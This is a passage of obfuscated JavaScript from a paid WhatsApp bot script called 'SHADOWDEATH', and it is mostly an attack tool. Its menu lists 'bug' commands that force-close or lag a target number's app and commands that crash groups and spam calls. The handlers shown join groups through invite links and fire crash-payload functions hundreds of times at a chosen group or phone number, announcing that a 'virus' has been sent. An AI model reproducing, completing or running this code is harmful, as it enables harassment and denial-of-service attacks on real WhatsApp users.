                'body': "© 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊",
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'sourceUrl': '',
                'mediaType': 0x1,
                'renderLargerThumbnail': false
              }
            },
            'footer': "© 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
            'buttons': _0x545f15,
            'viewOnce': true,
            'headerType': 0x6
          };
          await _0x47285b.sendMessage(_0x2f6673.chat, _0x4ed2c1, {
            'quoted': _0x2f6673
          });
        }
        break;
      case "allmenu":
        {
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🪐',
              'key': _0x2f6673.key
            }
          });
          var _0x32718e = await nou.drive.info();
          let _0xc978af = [{
            'buttonId': '.ðwñêr',
            'buttonText': {
              'displayText': "▢ Ðêvêlðþêr ßð†"
            }
          }, {
            'buttonId': ".†q†ð",
            'buttonText': {
              'displayText': "▢ †q†ð"
            }
          }];
          let _0x4e09e5 = {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604844054_vynx.jpg"
            },
            'caption': "Whatshapp Broo👋, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 \n`[ 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊𝗰 𝗜𝗻𝗳𝗼 ]`\n𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊\n𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊\n𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip\n𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! \n𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial\n\n`[ 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗕𝘂𝗴 ]`\n◇ .shadow 628xxx [ Button Bug ]\n◇ .xvshadow 628xxx [ Forclose Bug ]\n◇ .shadow-force 628xxx [ Forclose Hard ]\n◇ .invis-vx 628xxx [ Delay Invis ]\n◇ .invis-shadow 628xxx [ Delay Hard ]\n\n`[ 𝗕𝘂𝗴 𝗚𝗿𝗼𝘂𝗽 ]`\n◇ .vynx-blankgroup [ Link Group ]\n◇ .shadow-deathgroup [ Link Group ]\n\n`[ 𝗦𝗽𝗮𝗺 𝗖𝗮𝗹𝗹 ]`\n◇ .brutalspam 628xxx [ Spam Telepon ]\n\n`[ 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂 ]`\n◇ .autoread\n◇ .autopromosi\n◇ .autoreadsw\n◇ .autotyping\n◇ .addowner\n◇ .listowner\n◇ .delowner\n◇ .public\n◇ .self\n◇ .subdomain\n◇ .setimgmenu\n◇ .setimgfake\n◇ .setppbot\n◇ .clearsession\n◇ .clearchat\n◇ .resetdb\n◇ .restartbot\n◇ .getsc\n◇ .getcase\n◇ .listgc\n◇ .joingc\n◇ .joinch\n◇ .upchannel\n◇ .upchannel2\n◇ .ambilq\n\n`[ 𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂 ]` \n◇ .antilink\n◇ .antilink2\n◇ .blacklistjpm\n◇ .welcome\n◇ .add\n◇ .kick\n◇ .close\n◇ .open\n◇ .hidetag\n◇ .kudetagc\n◇ .leave\n◇ .tanda\n◇ .promote\n◇ .demote\n◇ .resetlinkgc\n◇ .linkgc\n\n`[ 𝗦𝘁𝗼𝗿𝗲 𝗠𝗲𝗻𝘂 ]`\n◇ .addrespon\n◇ .delrespon\n◇ .listrespon\n◇ .done\n◇ .proses\n◇ .jpm\n◇ .jpm2\n◇ .jpmtesti\n◇ .jpmslide\n◇ .jpmslideht\n◇ .sendtesti\n◇ .pushkontak\n◇ .pushkontak2\n◇ .payment\n◇ .produk\n\n`[ 𝗦𝗲𝗮𝗿𝗰𝗵𝗺𝗲𝗻𝘂 ]`\n◇ .yts\n◇ .apkmod\n◇ .pinterest\n◇ .gimage  \n◇ .sfile\n\n`[ 𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂 ]`\n◇ .cekidch\n◇ .cekidgc\n◇ .qc\n◇ .brat\n◇ .bratvid\n◇ .readviewonce\n◇ .stickerwm\n◇ .sticker\n\n`[ 𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂 ]`\n◇ .ai\n◇ .gpt\n◇ .tourl\n◇ .tourl2\n◇ .ssweb\n◇ .translate\n◇ .tohd\n◇ .shortlink\n◇ .shortlink2\n\n`[ 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗠𝗲𝗻𝘂 ]`\n◇ .tiktok \n◇ .tiktokmp3\n◇ .facebook\n◇ .capcut\n◇ .instagram\n◇ .ytmp3\n◇ .ytmp4\n◇ .play\n◇ .playvid\n◇ .gitclone\n◇ .mediafire\n",
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊",
                'body': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'thumbnailUrl': 'https://img1.pixhost.to/images/6076/604844805_vynx.jpg',
                'sourceUrl': " ",
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            },
            'footer': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
            'buttons': _0xc978af,
            'viewOnce': true,
            'headerType': 0x6
          };
          const _0x55b2bd = {
            'buttonId': "action",
            'buttonText': {
              'displayText': "This Button List"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "List Menu",
                'sections': [{
                  'title': "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                  'highlight_label': "Attack Whatsapp 🕊",
                  'rows': [{
                    'title': "BugMenu",
                    'description': "Shadow Attack Whatsapp🕊",
                    'id': ".bugmenu"
                  }, {
                    'title': 'MainMenu',
                    'description': "List FunMenu🛠",
                    'id': '.funmenu'
                  }, {
                    'title': "Searchmenu",
                    'description': "List Search Menu 🔍",
                    'id': ".smenu"
                  }, {
                    'title': "Toolsmenu",
                    'description': "List Toolsmenu👾",
                    'id': ".toolsmenu"
                  }, {
                    'title': "Buy Script",
                    'description': "Buy Scrpit. Shadow🛍️",
                    'id': '.sc'
                  }, {
                    'title': "Downloadmenu",
                    'description': "List Downloadmenu📥",
                    'id': ".downloadmenu"
                  }, {
                    'title': "Storemenu",
                    'description': "List Storemenu🛒",
                    'id': ".storemenu"
                  }, {
                    'title': "Groupmenu",
                    'description': "List Groupmenu🏘",
                    'id': ".grupmenu"
                  }, {
                    'title': "Ownermenu",
                    'description': 'Ownermenu👤',
                    'id': '.ownermenu'
                  }]
                }]
              })
            },
            'viewOnce': true
          };
          _0x4e09e5.buttons.push(_0x55b2bd);
          await _0x47285b.sendMessage(_0x2f6673.chat, _0x4e09e5, {
            'quoted': _0x5560b2
          });
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'audio': fs.readFileSync('./image/musik1.mp3'),
            'mimetype': 'audio/mpeg',
            'ptt': true
          }, {
            'quoted': _0x2f6673
          });
        }
        break;
      case "owner":
      case "vynx":
        {
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🕊',
              'key': _0x2f6673.key
            }
          });
          let _0x4e7070 = generateWAMessageFromContent(_0x2f6673.chat, {
            'viewOnceMessage': {
              'message': {
                'messageContextInfo': {
                  'deviceListMetadata': {},
                  'deviceListMetadataVersion': 0x2
                },
                'interactiveMessage': proto.Message.InteractiveMessage.create({
                  'contextInfo': {
                    'mentionedJid': [_0x2f6673.sender],
                    'isForwarded': true,
                    'forwardedNewsletterMessageInfo': {
                      'newsletterName': '𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊',
                      'newsletterJid': "120363409362506610@newsletter",
                      'serverMessageId': 0x8f
                    },
                    'businessMessageForwardInfo': {
                      'businessOwnerJid': _0x47285b.decodeJid(_0x47285b.user.id)
                    }
                  },
                  'body': proto.Message.InteractiveMessage.Body.create({
                    'text': "𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 𝗦𝗰𝗿𝗶𝗽𝘁 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊"
                  }),
                  'footer': proto.Message.InteractiveMessage.Footer.create({
                    'text': '𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊'
                  }),
                  'header': proto.Message.InteractiveMessage.Header.create({
                    'title': '',
                    'subtitle': '',
                    'hasMediaAttachment': true,
                    ...(await prepareWAMessageMedia({
                      'image': _0x4f556d
                    }, {
                      'upload': _0x47285b.waUploadToServer
                    }))
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': 'cta_url',
                      'buttonParamsJson': "{\"display_text\":\"𝗖𝗿𝗲𝗮𝘁𝗼𝗿\",\"url\":\"https://wa.me/62895320985817\",\"merchant_url\":\"https://wa.me/62895320985817\"}"
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"𝗦𝗮𝗹𝘂𝗿𝗮𝗻𝗗𝗲𝘃\",\"url\":\"https://whatsapp.com/channel/0029Vb9ghly6GcGM2ngCEk00\",\"merchant_url\":\"https://wa.me/62895320985817\"}"
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"𝗠𝗮𝗿𝗸𝗲𝘁𝗣𝗹𝗮𝗰𝗲\",\"url\":\"https://whatsapp.com/channel/0029Vb9ghly6GcGM2ngCEk00\",\"merchant_url\":\"https://wa.me/62895320985817\"}"
                    }]
                  })
                })
              }
            }
          }, {});
          await _0x47285b.relayMessage(_0x4e7070.key.remoteJid, _0x4e7070.message, {
            'messageId': _0x4e7070.key.id
          });
        }
        break;
      case "script":
      case 'sc':
        {
          _0x47285b.relayMessage(_0x2f6673.chat, {
            'requestPaymentMessage': {
              'currencyCodeIso4217': "IDR",
              'amount1000': 0x4c4b400,
              'requestFrom': _0x2f6673.sender,
              'noteMessage': {
                'extendedTextMessage': {
                  'text': "*▧ 「 sᴄʀɪᴘᴛ - 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛 4 ᴠɪᴘ  」*\n- sᴄʀɪᴘᴛ 𝟸𝟻𝙺 - 𝙵𝚁𝙴𝙴 𝚄𝙿\n- ʀᴇssᴇʟʟᴇʀ 𝟻𝟶𝙺 - 𝙵𝚁𝙴𝙴 𝚄𝙿\n\n𝚂𝙴𝙲𝚄𝚁𝙸𝚃𝚈 𝚂𝙲\n- 𝙺𝙴𝚈 \n- 𝙰𝙽𝚃𝙸 𝙲𝚁𝙰𝙲𝙺\n\n𝚂𝙲𝚁𝙸𝙿𝚃 𝙱𝚄𝙶 ɢᴀᴄᴏʀ\n𝙼𝙸𝙽𝙰𝚃 𝙲𝙷𝙰𝚃 𝙾𝚆𝙽𝙴𝚁\nwa.me/62895320985817\n",
                  'contextInfo': {
                    'externalAdReply': {
                      'showAdAttribution': true
                    }
                  }
                }
              }
            }
          }, {});
          await sleep(0x9c4);
        }
        break;
      case "tqto":
      case "credit":
        {
          let _0x127e55 = [{
            'buttonId': '.owner',
            'buttonText': {
              'displayText': "▢ 𝗗͢𝗲͠𝘃𝗲𝗹𝗼͠𝗽𝗲𝗿͢ 𝗦͠𝗰𝗿𝗶𝗽𝘁"
            }
          }, {
            'buttonId': '.sc',
            'buttonText': {
              'displayText': "▢ Buy Script"
            }
          }];
          let _0x3958d5 = {
            'document': {
              'url': "https://t.me/RizkyNotDev"
            },
            'mimetype': 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            'fileName': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
            'fileLength': 0x38d7ea4c67fff,
            'pageCount': 0x1869f,
            'caption': "`╭━━━⊱ [ 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 𝐒𝐔𝐏𝐏𝐎𝐑𝐓 ]`\n┃❏ ᴠʏɴx [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]\n┃❏ ʀᴇᴠᴀ [ ᴍʏ ɢʀɪʟs]\n┃❏ ᴅᴇᴘᴀʏʏ [ sᴇɴsᴇɪ ]\n┃❏ ᴇʀʟᴀɴɢɢᴀ [ sᴇɴsᴇɪ ]\n┃❏ ᴅᴇᴡᴀ ᴍᴀʀᴢ [ ʙᴇsᴛ ғʀɪᴇɴᴅ ]\n┃❏ ᴋᴏᴍᴏᴅᴏxᴘʟᴏɪᴛ[ ʙᴇsᴛ ғʀɪᴇɴᴅ ]\n┃❏ ᴀʟɪᴘ [ ᴘᴀᴛɴᴇʀ ]\n┃❏ ᴋᴀʟʟ ᴏғғɪᴄɪᴀʟ [ ʙᴇsᴛ ғʀɪᴇɴᴅ ]\n┃❏ ᴛᴀᴍᴀᴄʀᴀsʜ [ ғʀɪᴇɴᴅ ]\n┃❏ ᴄɪᴏᴏ ᴏғғᴄ [ ғʀɪᴇɴᴅ ]\n┃❏ sʜᴅ ʀᴀᴘᴢ [ ғʀɪᴇɴᴅ ]\n┃❏ sʜᴅ ʟɪᴛᴀ [ ғʀɪᴇɴᴅ ]\n┃❏ ᴋʏᴀᴍɪ sɪʟᴇɴᴄᴇ [ ғʀɪᴇɴᴅ ]\n┃❏ ᴅᴀᴠᴀ xғ [ ғʀɪᴇɴᴅ ]\n┃❏ ᴋʏᴜʀᴏ [ ғʀɪᴇɴᴅ ]\n┃❏ ᴄᴇʟʟᴏ ᴏғғɪᴄɪᴀʟ [ ғʀɪᴇɴᴅ ]\n┃❏ sʜᴀᴅᴏᴡ [ ғʀɪᴇɴᴅ ]\n┃❏ ᴠ𝟷𝟷ɴx [ ғʀɪᴇɴᴅ ]\n┃❏ ᴘᴇɴɢɢᴜɴᴀ sᴄʀɪᴘᴛ\n╰━━━━━━━━━━━━━━━━━\n",
            'footer': "© VynxNoCounter",
            'buttons': _0x127e55,
            'headerType': 0x1,
            'contextInfo': {
              'forwardingScore': 0x1869f,
              'externalAdReply': {
                'body': "𝐕𝐲𝐧𝐱𝐕",
                'containsAutoReply': true,
                'mediaType': 0x1,
                'mediaUrl': "peler",
                'renderLargerThumbnail': false,
                'showAdAttribution': false,
                'sourceId': "Tes",
                'sourceType': "PDF",
                'previewType': "PDF",
                'sourceUrl': "https.íd.co/VynxOfficial",
                'thumbnail': fs.readFileSync('./image/vynx.jpg'),
                'thumbnailUrl': fs.readFileSync("./image/vynx.jpg"),
                'title': "Vynxx"
              }
            },
            'viewOnce': true,
            'headerType': 0x6
          };
          await _0x47285b.sendMessage(_0x2f6673.chat, _0x3958d5, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "delete":
      case 'del':
        {
          if (_0x2f6673.isGroup) {
            if (!_0x429a13 && !_0x2f6673.isAdmin) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + mess.admin,
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            if (!_0x2f6673.quoted) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "reply pesannya",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            if (_0x2f6673.quoted.fromMe) {
              _0x47285b.sendMessage(_0x2f6673.chat, {
                'delete': {
                  'remoteJid': _0x2f6673.chat,
                  'fromMe': true,
                  'id': _0x2f6673.quoted.id,
                  'participant': _0x2f6673.quoted.sender
                }
              });
            } else {
              if (!_0x2f6673.isBotAdmin) {
                return _0x47285b.sendMessage(_0x2f6673.chat, {
                  'text': '' + mess.botAdmin,
                  'contextInfo': {
                    'mentionedJid': [_0x2f6673.sender],
                    'externalAdReply': {
                      'showAdAttribution': true,
                      'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                      'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                      'body': 'VynxOfficial',
                      'previewType': "PHOTO"
                    }
                  }
                }, {
                  'quoted': _0x5560b2
                });
              }
              _0x47285b.sendMessage(_0x2f6673.chat, {
                'delete': {
                  'remoteJid': _0x2f6673.chat,
                  'fromMe': false,
                  'id': _0x2f6673.quoted.id,
                  'participant': _0x2f6673.quoted.sender
                }
              });
            }
          } else {
            if (!_0x429a13) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + mess.owner,
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            if (!_0x2f6673.quoted) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("\n *Example Command :*\n *" + ('.' + _0x4345b8) + "* " + "reply pesan" + "\n"),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            _0x47285b.sendMessage(_0x2f6673.chat, {
              'delete': {
                'remoteJid': _0x2f6673.chat,
                'fromMe': false,
                'id': _0x2f6673.quoted.id,
                'participant': _0x2f6673.quoted.sender
              }
            });
          }
        }
        break;
      case "shadow":
        {
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'react': {
              'text': '🕊',
              'key': _0x2f6673.key
            }
          });
          if (!q) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Cara Penggunaan : *" + _0x4345b8 + "* 628xxxx"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x5bf609 = q.replace(/[^0-9]/g, '');
          const _0x3c10ee = "\n𝐓𝐚𝐫𝐠𝐞𝐭 : *" + _0x5bf609 + "* \n";
          let _0x4037ee = [{
            'buttonId': 'action',
            'buttonText': {
              'displayText': "𝐒𝐄𝐋𝐄𝐂𝐓 𝐁𝐔𝐆"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': 'single_select',
              'paramsJson': JSON.stringify({
                'title': "Select Button",
                'sections': [{
                  'title': "sɪʟᴀʜᴋᴀɴ ᴘɪʟɪʜ ʙᴜɢ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ",
                  'highlight_label': '',
                  'rows': [{
                    'title': "𝐒𝐡𝐚𝐝𝐨𝐰-𝐅𝐨𝐫𝐜𝐞🕊",
                    'description': "Forclose Hard",
                    'id': ".shadow-force " + _0x5bf609
                  }, {
                    'title': "𝐗𝐯𝐒𝐡𝐚𝐝𝐨𝐰🕊",
                    'description': 'Forclose',
                    'id': ".xvdep " + _0x5bf609
                  }, {
                    'title': "𝐈𝐧𝐯𝐢𝐬-𝐕𝐱🕊",
                    'description': "Delay Maker",
                    'id': ".invis-vx " + _0x5bf609
                  }, {
                    'title': '𝐈𝐧𝐯𝐢𝐬-𝐒𝐡𝐚𝐝𝐨𝐰🕊',
                    'description': "Delay Maker Hard",
                    'id': ".invis-shadow " + _0x5bf609
                  }]
                }]
              })
            },
            'viewOnce': true
          }];
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604845970_vynx.jpg"
            },
            'caption': _0x3c10ee,
            'contextInfo': {
              'mentionedJid': [_0x2f6673.sender],
              'forwardingScore': 0x3e7,
              'isForwarded': true,
              'externalAdReply': {
                'containsAutoReply': true,
                'mediaType': 0x1,
                'mediaUrl': "https://img1.pixhost.to/images/6083/604949714_vynx.jpg",
                'renderLargerThumbnail': false,
                'showAdAttribution': true,
                'sourceUrl': "120363409362506610@newsletter",
                'thumbnailUrl': "https://img1.pixhost.to/images/6076/604845970_vynx.jpg",
                'title': '𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊',
                'body': '',
                'mentionedJid': [_0x2f6673.sender],
                'isForwarded': true
              },
              'businessMessageForwardInfo': {
                'businessOwnerJid': _0x47285b.decodeJid(_0x47285b.user.id)
              }
            },
            'footer': "ShaowDeath",
            'buttons': _0x4037ee,
            'headerType': 0x1,
            'viewOnce': true
          }, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "vynx-blankgroup":
        {
          if (!_0x329cc3 && !isOwner && !isUnli) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Khusus Owner",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!_0x1aeaf2) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("*Example:*\n" + ('.' + _0x4345b8) + " https:// Atau 9741@g.us"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x16690f = _0x3e49e9[0x0];
          let _0x12633f;
          if (_0x16690f.includes("https://chat.whatsapp.com/")) {
            _0x12633f = _0x16690f.split("https://chat.whatsapp.com/")[0x1];
            if (!_0x12633f) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "invalid group link",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
            try {
              let _0x5020c5 = await _0x47285b.groupAcceptInvite(_0x12633f);
              _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': '' + ("Sukses! " + _0x4345b8 + " Mengirimkan Virus Kedalam Grup: " + _0x16690f + " (Group ID: " + _0x12633f + ')'),
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
              for (let _0x461ef7 = 0x0; _0x461ef7 < 0x12c; _0x461ef7++) {
                await _0x52fe39(_0x5020c5);
                await _0x52fe39(_0x5020c5);
                await _0x52fe39(_0x5020c5);
                await _0x52fe39(_0x5020c5);
              }
            } catch (_0x2bb515) {
              return _0x47285b.sendMessage(_0x2f6673.chat, {
                'text': "Bot Harus Keluar Dari Grup Yang Ingin DiSerang Terlebih Dahulu.",
                'contextInfo': {
                  'mentionedJid': [_0x2f6673.sender],
                  'externalAdReply': {
                    'showAdAttribution': true,
                    'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                    'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                    'body': 'VynxOfficial',
                    'previewType': "PHOTO"
                  }
                }
              }, {
                'quoted': _0x5560b2
              });
            }
          } else {
            _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Sukses! " + _0x4345b8 + " Mengirimkan Virus Kedalam Grup: " + _0x16690f),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
            for (let _0xc08c3b = 0x0; _0xc08c3b < 0x12c; _0xc08c3b++) {
              await _0x52fe39(_0x16690f);
              await _0x52fe39(_0x16690f);
              await _0x52fe39(_0x16690f);
              await _0x52fe39(_0x16690f);
            }
          }
        }
        break;
      case 'shadow-force':
        {
          if (!isOwner && !_0x329cc3) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Fitur Bug Khusus Owner",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          if (!q) {
            _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': '' + ("Penggunaan " + ('.' + _0x4345b8) + " 628xxx"),
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                  'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                  'body': 'VynxOfficial',
                  'previewType': "PHOTO"
                }
              }
            }, {
              'quoted': _0x5560b2
            });
          }
          let _0x5b8b14 = q.replace(/[^0-9]/g, '');
          if (_0x5b8b14.startsWith('0')) {
            return reply("Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : " + ('.' + _0x4345b8) + " 628xxx");
          }
          let _0x5f5cbd = _0x5b8b14 + '@s.whatsapp.net';
          _0x47285b.sendMessage(_0x2f6673.chat, {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604845970_vynx.jpg"
            },
            'caption': "╭━━〔 𝐒𝐮𝐤𝐬𝐞𝐬 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠 〕━⬣\n┃ 𝐓𝐲𝐩𝐞 : shadow-force [ 𝐅𝐨𝐫𝐜𝐥𝐨𝐬𝐞𝐇𝐚𝐫𝐝 ]\n┃ 𝐓𝐚𝐫𝐠𝐞𝐭 : " + _0x5b8b14 + "\n┃ 𝐒𝐭𝐚𝐭𝐮𝐬 : Udah Ceklis 1 broo 🕊\n┃ 𝐍𝐨𝐭𝐞 : Harap Jeda 5-10 Menit!.\n╰━━━━━━━━━━━━━━━━━⬣",
            'gifPlayback': true
          }, {
            'quoted': _0x2f6673
          });
          for (let _0x58c444 = 0x0; _0x58c444 < 0x5; _0x58c444++) {
            await _0x5f2021(_0x5f5cbd);
            await _0x5f2021(_0x5f5cbd);
          }
          await _0x5f2021(_0x5f5cbd);
          await _0x5f2021(_0x5f5cbd);
        }
        break;
      case 'xvshadow':
        {
          if (!isOwner && !_0x329cc3) {
            return _0x47285b.sendMessage(_0x2f6673.chat, {
              'text': "Fitur Bug Khusus Owner",
              'contextInfo': {
                'mentionedJid': [_0x2f6673.sender],
                'externalAdReply': {
                  'showAdAttribution': true,
                  'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
